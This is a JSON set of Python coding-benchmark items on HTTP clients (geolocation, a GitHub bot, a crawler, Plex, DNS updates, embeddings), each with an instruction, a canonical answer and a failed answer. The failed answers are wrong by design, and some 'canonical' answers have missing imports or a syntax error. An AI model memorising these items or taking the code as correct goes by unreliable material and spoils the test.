[
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Python class that implements a ScalarFunction to retrieve geographic location information for a given IP address using an external API.\n\nClass Description: The GetLocation class extends PyFlink's ScalarFunction to provide IP-to-location functionality. It makes HTTP requests to the ip2location.io API and processes the response to extract country, state, and city information.\n\nAttributes: None\n\nMethods:\n- eval(ip_address: str) -> str: \n  Takes an IP address as input, queries the ip2location.io API, and returns a JSON string containing the country code, region name, and city name. If the request fails, returns an empty JSON object. The API key is retrieved from environment variables.\n\n  Input Parameters:\n  - ip_address: str - The IP address to look up\n\n  Return Type:\n  - str - JSON string containing location information in format {'country': str, 'state': str, 'city': str} or empty object if request fails",
    "Canonical_solution": "import os\nimport json\nimport requests\nfrom pyflink.table.udf import ScalarFunction\nfrom pyflink.table import DataTypes\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address):\n        url = \"https://api.ip2location.io\"\n        response = requests.get(url, params={\n            'ip': ip_address,\n            'key': os.environ.get(\"IP_CODING_KEY\")\n        })\n\n        if response.status_code != 200:\n            return json.dumps({})\n\n        data = json.loads(response.text)\n        country = data.get('country_code', '')\n        state = data.get('region_name', '')\n        city = data.get('city_name', '')\n        return json.dumps({'country': country, 'state': state, 'city': city})",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nfrom pyflink.table.udf import ScalarFunction\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address: str) -> str:\n        api_key = os.getenv('IP2LOCATION_API_KEY')\n        if not api_key:\n            return '{}'\n        \n        url = f'https://api.ip2location.io/v2/?ip={ip_address}&key={api_key}'\n        try:\n            response = requests.get(url)\n            response.raise_for_status()\n            data = response.json()\n            location_info = {\n                'country': data.get('country_code', ''),\n                'state': data.get('region_name', ''),\n                'city': data.get('city_name', '')\n            }\n            return str(location_info)\n        except requests.RequestException:\n            return '{}'"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a function that handles GitHub webhook events for pull requests, fetches a random meme from an API, and posts it as a comment on the pull request.\n\nFunction Description: The function `bot()` is a webhook handler that processes GitHub pull request events. When a pull request is opened, it authenticates with the GitHub API, fetches a random meme from an external API, and posts the meme as a comment on the pull request. The function uses the `requests` library for HTTP communication with the meme API and the `PyGithub` library for GitHub interactions.\n\nInput: \n- The function receives a Flask `request` object containing JSON payload from GitHub webhook. The payload includes:\n  - `action`: The event type (e.g., \"opened\")\n  - `pull_request`: Details about the pull request\n  - `repository`: Information about the repository containing owner and name\n\nOutput: \n- Returns \"ok\" string in all cases (success or failure) to acknowledge webhook receipt\n- As a side effect, posts a meme comment on the pull request when conditions are met",
    "Canonical_solution": "import os\nimport requests\nfrom dotenv import load_dotenv\nfrom flask import Flask, request\nfrom github import Github, GithubIntegration\n\nload_dotenv()\n\n__flask_app_name__ = 'github_bot'\napp = Flask(__flask_app_name__)\napp_id = int(os.environ['GITHUB_APP_ID'])\nwith open(\n        os.path.normpath(os.path.expanduser(os.getenv(\"GITHUB_PRIVATE_KEY_FILE\", '~/.certs/github/bot_key.pem'))),\n        'r'\n) as cert_file:\n    app_key = cert_file.read()\n\ngit_integration = GithubIntegration(\n    app_id,\n    app_key,\n)\n\ndef bot():\n    payload = request.json\n    if not all(k in payload.keys() for k in ['action', 'pull_request']) and \\\n            payload['action'] == 'opened':\n        return \"ok\"\n    owner = payload['repository']['owner']['login']\n    repo_name = payload['repository']['name']\n    git_connection = Github(\n        login_or_token=git_integration.get_access_token(\n            git_integration.get_installation(owner, repo_name).id\n        ).token\n    )\n    repo = git_connection.get_repo(f\"{owner}/{repo_name}\")\n    issue = repo.get_issue(number=payload['pull_request']['number'])\n    response = requests.get(url='https://meme-api.herokuapp.com/gimme')\n    if response.status_code != 200:\n        return 'ok'\n    meme_url = response.json()['preview'][-1]\n    issue.create_comment(f\"![Alt Text]({meme_url})\")\n    return \"ok\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom github import Github\nfrom flask import request, jsonify\n\ndef bot():\n    payload = request.json\n    action = payload.get('action')\n    pull_request = payload.get('pull_request')\n    repository = payload.get('repository')\n\n    if action == 'opened':\n        repo_name = f\"{repository['owner']['login']}/{repository['name']}\"\n        pr_number = pull_request['number']\n        meme_url = get_random_meme()\n        post_meme_comment(repo_name, pr_number, meme_url)\n\n    return \"ok\"\n\ndef get_random_meme():\n    response = requests.get(\"https://api.imgflip.com/get_memes\")\n    data = response.json()\n    memes = data['data']['memes']\n    random_meme = memes[0]  # Get the first meme as a placeholder\n    return random_meme['url']\n\ndef post_meme_comment(repo_name, pr_number, meme_url):\n    g = Github(\"YOUR_GITHUB_TOKEN\")\n    repo = g.get_repo(repo_name)\n    pr = repo.get_pull(pr_number)\n    pr.create_issue_comment(f\"Here's a meme for you:\\n\\n{meme_url}\")\n```"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a function that sends audio and transcript files to a server for processing using HTTP POST request and handles the response.\n\nFunction Description: The function `gentle_request` sends a WAV audio file and its corresponding transcript text file to a specified server using an HTTP POST request. It checks if the filenames match, reads the transcript content, and sends both files to the server. The function handles the server response, checks for errors, and optionally prints debug information.\n\nInput:\n- `wav_path` [str] - Path to the WAV audio file to be sent.\n- `txt_path` [str] - Path to the transcript text file corresponding to the audio.\n- `server_addr` [str] - IP address or hostname of the server.\n- `port` [int] - Port number on which the server is listening.\n- `debug` [bool, optional] - If True, prints the server response in JSON format. Default is False.\n\nOutput:\n- `response` [requests.Response or None] - The server's HTTP response object if the request is successful, otherwise None. The response can be parsed for status code, headers, and content.",
    "Canonical_solution": "from docopt import docopt\nfrom glob import glob\nfrom tqdm import tqdm\nimport os.path\nimport requests\nimport numpy as np\n\ndef gentle_request(wav_path,txt_path, server_addr, port, debug=False):\n    print('\\n')\n    response = None\n    wav_name = os.path.basename(wav_path)\n    txt_name = os.path.basename(txt_path)\n    if os.path.splitext(wav_name)[0] != os.path.splitext(txt_name)[0]:\n        print(' [!] wav name and transcript name does not match - exiting...')\n        return response\n    with open(txt_path, 'r', encoding='utf-8-sig') as txt_file:\n        print('Transcript - '+''.join(txt_file.readlines()))\n    with open(wav_path,'rb') as wav_file, open(txt_path, 'rb') as txt_file:\n        params = (('async','false'),)\n        files={'audio':(wav_name,wav_file),\n               'transcript':(txt_name,txt_file),\n               }\n        server_path = 'http://'+server_addr+':'+str(port)+'/transcriptions'\n        response = requests.post(server_path, params=params,files=files)\n        if response.status_code != 200:\n            print(' [!] External server({}) returned bad response({})'.format(server_path, response.status_code))\n    if debug:\n        print('Response')\n        print(response.json())\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef gentle_request(wav_path, txt_path, server_addr, port, debug=False):\n    if not os.path.exists(wav_path) or not os.path.exists(txt_path):\n        print(\"One or both files do not exist.\")\n        return None\n\n    wav_filename = os.path.basename(wav_path)\n    txt_filename = os.path.basename(txt_path)\n\n    if wav_filename[:-4] != txt_filename[:-4]:\n        print(\"Audio and transcript filenames do not match.\")\n        return None\n\n    with open(txt_path, 'r') as f:\n        transcript_content = f.read()\n\n    files = {\n        'audio': open(wav_path, 'rb'),\n        'transcript': (txt_filename, transcript_content)\n    }\n\n    url = f\"http://{server_addr}:{port}/process\"\n    try:\n        response = requests.post(url, files=files)\n        if debug:\n            print(response.json())\n        return response\n    except requests.exceptions.RequestException as e:\n        print(f\"An error occurred: {e}\")\n        return None\n    finally:\n        for file in files.values():\n            if isinstance(file, tuple):\n                file[1].close()\n            else:\n                file.close()\n```"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with a remote API, featuring automatic retries for failed requests, background polling for data refresh, and graceful shutdown handling.\n\nClass Description: The Fetcher class provides a robust HTTP client implementation for API interactions with features like exponential backoff retries, periodic background data refreshing, and proper thread cleanup on program exit.\n\nAttributes:\n- _base_url: str - The base URL for API endpoints\n- _api_key: str - API key for authentication\n- _stop_polling_event: Event - Threading event to control polling thread lifecycle\n- _exit_monitor: Thread - Thread that monitors main thread for program exit\n- _poller_thread: Thread - Thread that handles periodic data refreshing\n\nMethods:\n- __init__(base_url: str, api_key: str) -> None - Initializes the fetcher with API configuration\n- run() -> None - Starts the background polling and exit monitoring threads\n- post(api: str, body: Dict[str, str]) -> None - Sends a POST request to specified API endpoint\n- _fetch_url(url: str, api_key: str) -> Dict - Performs a GET request with retry logic (private)\n- _post_url(url: str, api_key: str, body: Dict[str, str]) -> None - Performs a POST request (private)\n- _thread_func(base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int]) -> None - Background polling thread function (private)\n- _refresh_data(base_url: str, api_key: str) -> None - Refreshes data from multiple endpoints (private)\n- _monitor_exit(exit_event: Event) -> None - Monitors main thread for program exit (private)",
    "Canonical_solution": "import logging\nimport os\nimport threading\nimport time\nimport typing\nimport requests\n\nfrom threading import Thread, Event\nfrom typing import Dict, Optional\nfrom tenacity import (\n    RetryError,\n    retry,\n    stop_after_attempt,\n    wait_exponential,\n    retry_if_exception,\n)\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str):\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = Event()\n        self._exit_monitor = Thread(\n            target=self._monitor_exit, args=(self._stop_polling_event,), daemon=True\n        )\n        self._poller_thread = Thread(\n            target=self._thread_func,\n            args=(\n                self._base_url,\n                self._api_key,\n                self._stop_polling_event,\n                int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_POLLING_INTERVAL\") or 5),\n            ),\n        )\n\n    def run(self):\n        self._refresh_data(self._base_url, self._api_key)\n        self._exit_monitor.start()\n        self._poller_thread.start()\n\n    def post(self, api: str, body: Dict[str, str]):\n        self._post_url(f\"{self._base_url}/v1/traceloop/{api}\", self._api_key, body)\n\n    @retry(\n        wait=wait_exponential(multiplier=1, min=4),\n        stop=stop_after_attempt(int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_MAX_RETRIES\") or 3)),\n        retry=retry_if_exception(lambda e: isinstance(e, requests.exceptions.HTTPError) and (500 <= e.response.status_code < 600),\n    )\n    def _fetch_url(self, url: str, api_key: str):\n        response = requests.get(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n        )\n\n        if response.status_code != 200:\n            if response.status_code == 401 or response.status_code == 403:\n                logging.error(\"Authorization error: Invalid Traceloop API key.\")\n                raise requests.exceptions.HTTPError(response=response)\n            else:\n                logging.error(\"Request failed: %s\", response.status_code)\n                raise requests.exceptions.HTTPError(response=response)\n        else:\n            return response.json()\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]):\n        response = requests.post(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n            json=body,\n        )\n\n        if response.status_code != 200:\n            raise requests.exceptions.HTTPError(response=response)\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int] = 5):\n        while not stop_polling_event.is_set():\n            try:\n                self._refresh_data(base_url, api_key)\n            except RetryError:\n                logging.error(\"Request failed after retries : stopped polling\")\n                break\n\n            time.sleep(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str):\n        self._fetch_url(f\"{base_url}/v1/traceloop/prompts\", api_key)\n        self._fetch_url(f\"{base_url}/v1/traceloop/pii/tracing-allow-list\", api_key)\n\n    def _monitor_exit(self, exit_event: Event):\n        main_thread = threading.main_thread()\n        main_thread.join()\n        exit_event.set()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport threading\nimport time\nimport requests\nfrom typing import Dict, Optional\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str) -> None:\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = threading.Event()\n        self._exit_monitor = threading.Thread(target=self._monitor_exit, args=(self._stop_polling_event,))\n        self._poller_thread = threading.Thread(target=self._thread_func, args=(self._base_url, self._api_key, self._stop_polling_event, 60))\n\n    def run(self) -> None:\n        self._exit_monitor.start()\n        self._poller_thread.start()\n\n    def post(self, api: str, body: Dict[str, str]) -> None:\n        url = f\"{self._base_url}/{api}\"\n        self._post_url(url, self._api_key, body)\n\n    def _fetch_url(self, url: str, api_key: str) -> Dict:\n        headers = {'Authorization': f'Bearer {api_key}'}\n        max_retries = 5\n        delay = 1\n        for attempt in range(max_retries):\n            try:\n                response = requests.get(url, headers=headers)\n                response.raise_for_status()\n                return response.json()\n            except requests.RequestException as e:\n                if attempt < max_retries - 1:\n                    time.sleep(delay)\n                    delay *= 2\n                else:\n                    raise e\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]) -> None:\n        headers = {'Authorization': f'Bearer {api_key}', 'Content-Type': 'application/json'}\n        response = requests.post(url, json=body, headers=headers)\n        response.raise_for_status()\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int]) -> None:\n        while not stop_polling_event.is_set():\n            self._refresh_data(base_url, api_key)\n            time.sleep(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str) -> None:\n        # Example endpoints, replace with actual endpoints\n        endpoints = ['data1', 'data2']\n        for endpoint in endpoints:\n            url = f\"{base_url}/{endpoint}\"\n            try:\n                data = self._fetch_url(url, api_key)\n                print(f\"Data from {endpoint}: {data}\")\n            except Exception as e:\n                print(f\"Failed to fetch data from {endpoint}: {e}\")\n\n    def _monitor_exit(self, exit_event: Event) -> None:\n        main_thread = threading.main_thread()\n        main_thread.join()\n        exit_event.set()\n```"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Implement a web crawler class that can fetch HTML content from single or multiple URLs, with support for threaded operations and error handling.\n\nClass Description: SimpleCrawler is a class designed to fetch HTML content from web pages either individually or in parallel using threading. It handles various HTTP request scenarios and errors while maintaining proper logging.\n\nAttributes:\n_results: dict - Stores fetched HTML content when operating in threaded mode\nMAX_FILE_SIZE: int - Maximum allowed file size for fetched content (20MB)\nMIN_FILE_SIZE: int - Minimum allowed file size for fetched content (10 bytes)\nLOGGER: Logger - Logger instance for error and debug messages\nUSER_AGENT: str - User agent string for HTTP requests\nHEADERS: dict - Default headers for HTTP requests\n\nMethods:\nfetch_url(url: str, request_args: dict = None) -> str - Fetches HTML content from a single URL\nInput:\n  url: str - URL to fetch\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\n_fetch_url(url: str, is_threaded: bool, request_args: dict = None) -> str - Internal method that performs the actual URL fetching\nInput:\n  url: str - URL to fetch\n  is_threaded: bool - Flag indicating if operation is threaded\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\nfetch_urls(urls: list, request_args: dict = None) -> dict - Fetches HTML content from multiple URLs in parallel using threads\nInput:\n  urls: list - List of URLs to fetch\n  request_args: dict (optional) - Additional arguments for the requests\nOutput:\n  dict - Dictionary mapping URLs to their HTML content",
    "Canonical_solution": "import socket\nimport copy\nimport threading\nimport logging\nimport requests\nimport urllib3\nfrom .response_decoder import decode_response\n\nMAX_FILE_SIZE = 20000000\nMIN_FILE_SIZE = 10\n\nLOGGER = logging.getLogger(__name__)\nUSER_AGENT = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\"\nHEADERS = {\n    \"Connection\": \"close\",\n    \"User-Agent\": USER_AGENT,\n}\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclass SimpleCrawler:\n    _results = {}\n\n    def __init__(self):\n        pass\n\n    def fetch_url(self, url, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and returns the html\n        :param url: URL to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: HTML content of the URL\n        \"\"\"\n        return self._fetch_url(url, False, request_args=request_args)\n\n    def _fetch_url(self, url, is_threaded, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and saves the html in _results\n        :param url: URL to fetch\n        :param is_threaded: If True, results will be stored for later processing\n        :param request_args: optional arguments that `request` takes\n        :return: html of the url\n        \"\"\"\n        if request_args is None:\n            request_args = {}\n        if \"headers\" not in request_args:\n            request_args[\"headers\"] = HEADERS\n\n        html_str = None\n        try:\n            response = requests.get(\n                url, verify=False, allow_redirects=True, **request_args)\n            \n            if response.status_code != 200:\n                LOGGER.error(\"not a 200 response: %s\", response.status_code)\n            elif response.text is None or len(response.text) < MIN_FILE_SIZE:\n                LOGGER.error(\"too small/incorrect: %s %s\", url, len(response.text))\n            elif len(response.text) > MAX_FILE_SIZE:\n                LOGGER.error(\"too large: %s %s\", url, len(response.text))\n            else:\n                html_str = decode_response(response)\n                \n        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidURL):\n            LOGGER.error(\"malformed URL: %s\", url)\n        except requests.exceptions.TooManyRedirects:\n            LOGGER.error(\"too many redirects: %s\", url)\n        except requests.exceptions.SSLError as err:\n            LOGGER.error(\"SSL: %s %s\", url, err)\n        except (socket.timeout, requests.exceptions.ConnectionError, \n               requests.exceptions.Timeout, socket.error, socket.gaierror) as err:\n            LOGGER.error(\"connection/timeout error: %s %s\", url, err)\n            \n        if is_threaded:\n            self._results[url] = html_str\n        return html_str\n\n    def fetch_urls(self, urls, request_args=None):\n        \"\"\"\n        Crawls the html content of all given urls in parallel.\n        :param urls: List of URLs to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: Dictionary of URL to HTML content mappings\n        \"\"\"\n        threads = [\n            threading.Thread(target=self._fetch_url, args=(url, True, request_args))\n            for url in urls\n        ]\n        for thread in threads:\n            thread.start()\n        for thread in threads:\n            thread.join()\n\n        results = copy.deepcopy(self._results)\n        self._results = {}\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom threading import Thread\nfrom queue import Queue\nimport logging\n\nclass SimpleCrawler:\n    _results = {}\n    MAX_FILE_SIZE = 20 * 1024 * 1024  # 20MB\n    MIN_FILE_SIZE = 10  # 10 bytes\n    LOGGER = logging.getLogger(__name__)\n    USER_AGENT = 'SimpleCrawler/1.0'\n    HEADERS = {'User-Agent': USER_AGENT}\n\n    def fetch_url(self, url: str, request_args: dict = None) -> str:\n        return self._fetch_url(url, False, request_args)\n\n    def _fetch_url(self, url: str, is_threaded: bool, request_args: dict = None) -> str:\n        try:\n            response = requests.get(url, headers=self.HEADERS, **(request_args or {}))\n            response.raise_for_status()\n            if self.MIN_FILE_SIZE <= len(response.content) <= self.MAX_FILE_SIZE:\n                return response.text\n            else:\n                self.LOGGER.warning(f\"Content size out of bounds for {url}\")\n        except requests.RequestException as e:\n            self.LOGGER.error(f\"Failed to fetch {url}: {e}\")\n        return None\n\n    def fetch_urls(self, urls: list, request_args: dict = None) -> dict:\n        result_queue = Queue()\n        threads = []\n\n        def worker():\n            while True:\n                url = result_queue.get()\n                if url is None:\n                    break\n                html_content = self._fetch_url(url, True, request_args)\n                self._results[url] = html_content\n                result_queue.task_done()\n\n        for _ in range(len(urls)):\n            thread = Thread(target=worker)\n            thread.start()\n            threads.append(thread)\n\n        for url in urls:\n            result_queue.put(url)\n\n        result_queue.join()\n        for _ in range(len(threads)):\n            result_queue.put(None)\n\n        for thread in threads:\n            thread.join()\n\n        return self._results\n```"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Implement a Python class to interact with a Plex Media Server using HTTP requests, including functionality for making authenticated requests, validating server connections, and updating media libraries.\n\nClass Description: PlexMediaServer is a class that provides methods to communicate with a Plex Media Server instance. It handles HTTP requests with proper authentication, validates server connections and library access, and triggers library updates.\n\nAttributes:\n- TIMEOUT: [int] - Default timeout in seconds for HTTP requests\n- object: [object] - The media server instance containing configuration options\n\nMethods:\n- __init__(mediaserver_instance: object) -> None - Initializes the PlexMediaServer with a media server instance containing configuration options\n- make_request(uri: str = '/', params: dict = {}) -> requests.Response - Makes an authenticated HTTP GET request to the Plex server with proper headers and SSL verification handling\n- validate() -> bool - Validates the connection to the Plex server and checks if configured libraries exist, raising exceptions for any issues\n- update() -> bool - Triggers refresh operations for all configured libraries, raising exceptions for any failures",
    "Canonical_solution": "import requests\nfrom urllib.parse import urlsplit, urlunsplit, urlencode\nimport warnings\n\nclass PlexMediaServer:\n    TIMEOUT = 5\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params={}):\n        headers = {'User-Agent': 'TubeSync'}\n        token = self.object.loaded_options['token']\n        params['X-Plex-Token'] = token\n        base_parts = urlsplit(self.object.url)\n        qs = urlencode(params)\n        url = urlunsplit((base_parts.scheme, base_parts.netloc, uri, qs, ''))\n        \n        if self.object.verify_https:\n            return requests.get(url, headers=headers, verify=True, timeout=self.TIMEOUT)\n        else:\n            with warnings.catch_warnings():\n                warnings.simplefilter(\"ignore\")\n                return requests.get(url, headers=headers, verify=False, timeout=self.TIMEOUT)\n\n    def validate(self):\n        try:\n            response = self.make_request('/library/sections')\n            if response.status_code != 200:\n                check_token = ''\n                if 400 <= response.status_code < 500:\n                    check_token = (' A 4XX error could mean your access token is being rejected.')\n                raise Exception(f'Invalid HTTP status code: {response.status_code}.' + check_token)\n            \n            parsed_response = ElementTree.fromstring(response.content)\n            remote_libraries = {}\n            for parent in parsed_response.iter('MediaContainer'):\n                for d in parent:\n                    library_id = d.attrib['key']\n                    library_name = d.attrib['title']\n                    remote_libraries[library_id] = library_name\n            \n            libraries = self.object.loaded_options['libraries'].strip().split(',')\n            for library_id in libraries:\n                library_id = library_id.strip()\n                if library_id not in remote_libraries:\n                    raise Exception(f'Library ID \"{library_id}\" does not exist on Plex Media Server')\n            return True\n            \n        except Exception as e:\n            raise Exception(f'Validation failed: {str(e)}')\n\n    def update(self):\n        libraries = self.object.loaded_options.get('libraries', '')\n        for library_id in libraries.split(','):\n            library_id = library_id.strip()\n            uri = f'/library/sections/{library_id}/refresh'\n            response = self.make_request(uri)\n            if response.status_code != 200:\n                raise Exception(f'Failed to refresh library \"{library_id}\", status code: {response.status_code}')\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\nclass PlexMediaServer:\n    TIMEOUT = 10\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params={}):\n        headers = {\n            'X-Plex-Token': self.object.token,\n            'Accept': 'application/json'\n        }\n        url = f\"https://{self.object.host}:{self.object.port}{uri}\"\n        response = requests.get(url, headers=headers, verify=self.object.verify_ssl, timeout=self.TIMEOUT, params=params)\n        response.raise_for_status()\n        return response\n\n    def validate(self):\n        try:\n            response = self.make_request('/status/sessions')\n            if response.status_code != 200:\n                raise Exception(\"Failed to connect to Plex server\")\n            # Additional validation logic for libraries can be added here\n        except requests.RequestException as e:\n            raise Exception(f\"Validation failed: {e}\")\n\n    def update(self):\n        try:\n            for library in self.object.libraries:\n                response = self.make_request(f'/library/sections/{library}/refresh')\n                if response.status_code != 200:\n                    raise Exception(f\"Failed to update library: {library}\")\n        except requests.RequestException as e:\n            raise Exception(f\"Update failed: {e}\")\n```"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Implement a Python class to interact with Hurricane Electric's dynamic DNS API for updating DNS records programmatically.\n\nClass Description: HurricaneElectricAPI is a client class that handles communication with Hurricane Electric's DNS service to update DNS records. It supports both direct connections and proxy connections.\n\nAttributes:\n- SITE: [str] - The target domain for the Hurricane Electric API (dyn.dns.he.net)\n- METHOD: [str] - The HTTP method to use for requests (POST)\n- ACTION: [str] - The API endpoint path (nic/update)\n- TOKEN_PARAM: [str] - The parameter name for the authentication token (password)\n- TOKEN: [str] - The authentication token/password for API access\n- PROXY: [str/None] - Optional proxy server address\n\nMethods:\n- __init__(token=\"password\", proxy=None) -> None - Initializes the API client with optional token and proxy settings\n- _request(param=None, **params) -> str - Internal method to make HTTP requests to the API\n- update_record(domain, value, record_type=\"A\") -> str - Updates a DNS record with the given value\n\nMethod Details:\n1. _request(param=None, **params) -> str\n   - Makes an HTTPS request to the Hurricane Electric API\n   - Input:\n     - param: [dict/None] - Optional base parameters\n     - **params: Additional request parameters\n   - Output: [str] - API response string\n   - Raises Exception on HTTP errors or API failures\n\n2. update_record(domain, value, record_type=\"A\") -> str\n   - Updates a DNS record with the specified value\n   - Input:\n     - domain: [str] - The domain name to update\n     - value: [str] - The new IP address or value\n     - record_type: [str] - The DNS record type (default: \"A\")\n   - Output: [str] - Human-readable status message about the update\n   - Raises Exception if the update fails",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom logging import info, debug, warning\n\nclass HurricaneElectricAPI:\n    def __init__(self, token=\"password\", proxy=None):\n        self.SITE = \"dyn.dns.he.net\"\n        self.METHOD = \"POST\"\n        self.ACTION = \"nic/update\"\n        self.TOKEN_PARAM = \"password\"\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param:\n            params.update(param)\n\n        params.update({self.TOKEN_PARAM: '***'})\n        info(\"%s/%s : %s\", self.SITE, self.ACTION, params)\n        params[self.TOKEN_PARAM] = self.TOKEN\n\n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + self.ACTION, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\"\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', self.ACTION, response.status, res)\n            raise Exception(res)\n        else:\n            debug('%s : result:%s', self.ACTION, res)\n            if not res:\n                raise Exception(\"empty response\")\n            elif res[:5] == \"nochg\" or res[:4] == \"good\":\n                return res\n            else:\n                raise Exception(res)\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        info(\">>>>>%s(%s)\", domain, record_type)\n        res = self._request(hostname=domain, myip=value)\n        if res[:4] == \"good\":\n            result = \"Record updated. New IP is: \" + res[5:-1]\n        elif res[:5] == \"nochg\":\n            result = \"IP not changed. IP is: \" + res[6:-1]\n        else:\n            result = \"Record update failed.\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\n\nclass HurricaneElectricAPI:\n    SITE = \"dyn.dns.he.net\"\n    METHOD = \"POST\"\n    ACTION = \"nic/update\"\n    TOKEN_PARAM = \"password\"\n    \n    def __init__(self, token=\"password\", proxy=None):\n        self.TOKEN = token\n        self.PROXY = proxy\n    \n    def _request(self, param=None, **params):\n        url = f\"https://{self.SITE}/{self.ACTION}\"\n        headers = {\"User-Agent\": \"HurricaneElectricAPI\"}\n        params[self.TOKEN_PARAM] = self.TOKEN\n        if param:\n            params.update(param)\n        \n        proxies = {\"https\": self.PROXY} if self.PROXY else None\n        \n        try:\n            response = requests.request(self.METHOD, url, headers=headers, data=params, proxies=proxies)\n            response.raise_for_status()\n            return response.text.strip()\n        except requests.RequestException as e:\n            raise Exception(f\"HTTP error occurred: {e}\")\n    \n    def update_record(self, domain, value, record_type=\"A\"):\n        params = {\n            \"hostname\": domain,\n            \"myip\": value,\n            \"recordtype\": record_type\n        }\n        try:\n            result = self._request(**params)\n            if \"good\" in result:\n                return f\"DNS record for {domain} updated successfully.\"\n            elif \"nochg\" in result:\n                return f\"No changes needed for {domain}.\"\n            else:\n                raise Exception(f\"Failed to update DNS record: {result}\")\n        except Exception as e:\n            raise Exception(f\"Update failed: {e}\")\n```"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API based on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding vector by making an HTTP POST request to a local API endpoint or using OpenAI's API, depending on the model specified. It handles the response, checks for errors, and returns the embedding as a NumPy array if successful.\n\nInput:\n- `word` (str): The input word or text for which to generate an embedding.\n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.1\". If the model name contains \"ada\", it uses OpenAI's API.\n\nOutput:\n- Returns a NumPy array containing the word embedding if the request is successful.\n- Returns None if an error occurs (prints the error details to the console).",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
